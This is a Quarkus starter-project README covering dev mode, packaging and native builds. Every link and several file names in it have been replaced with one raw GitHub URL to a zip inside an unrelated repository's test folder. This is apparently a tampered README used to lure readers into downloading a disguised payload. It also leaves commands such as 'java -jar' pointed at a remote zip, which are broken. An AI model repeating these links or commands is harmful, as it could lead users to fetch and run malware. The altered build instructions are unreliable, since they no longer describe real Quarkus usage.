# code-with-quarkus

This project uses Quarkus, the Supersonic Subatomic Java Framework.

If you want to learn more about Quarkus, please visit its website: <https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip>.

## Running the application in dev mode

You can run your application in dev mode that enables live coding using:

```shell script
./mvnw quarkus:dev
```

> **_NOTE:_**  Quarkus now ships with a Dev UI, which is available in dev mode only at <http://localhost:8080/q/dev/>.

## Packaging and running the application

The application can be packaged using:

```shell script
./mvnw package
```

It produces the `https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip` file in the `target/quarkus-app/` directory.
Be aware that it’s not an _über-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.

The application is now runnable using `java -jar https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip`.

If you want to build an _über-jar_, execute the following command:

```shell script
./mvnw package https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip
```

The application, packaged as an _über-jar_, is now runnable using `java -jar target/*https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip`.

## Creating a native executable

You can create a native executable using:

```shell script
./mvnw package -Dnative
```

Or, if you don't have GraalVM installed, you can run the native executable build in a container using:

```shell script
./mvnw package -Dnative https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip
```

You can then execute your native executable with: `./target/code-with-quarkus-1.0.0-SNAPSHOT-runner`

If you want to learn more about building native executables, please consult <https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip>.

## Related Guides

- REST ([guide](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)): A Jakarta REST implementation utilizing build time processing and Vert.x. This extension is not compatible with the quarkus-resteasy extension, or any of the extensions that depend on it.
- JDBC Driver - H2 ([guide](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)): Connect to the H2 database via JDBC

## Provided Code

### REST

Easily start your REST Web Services

[Related guide section...](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)
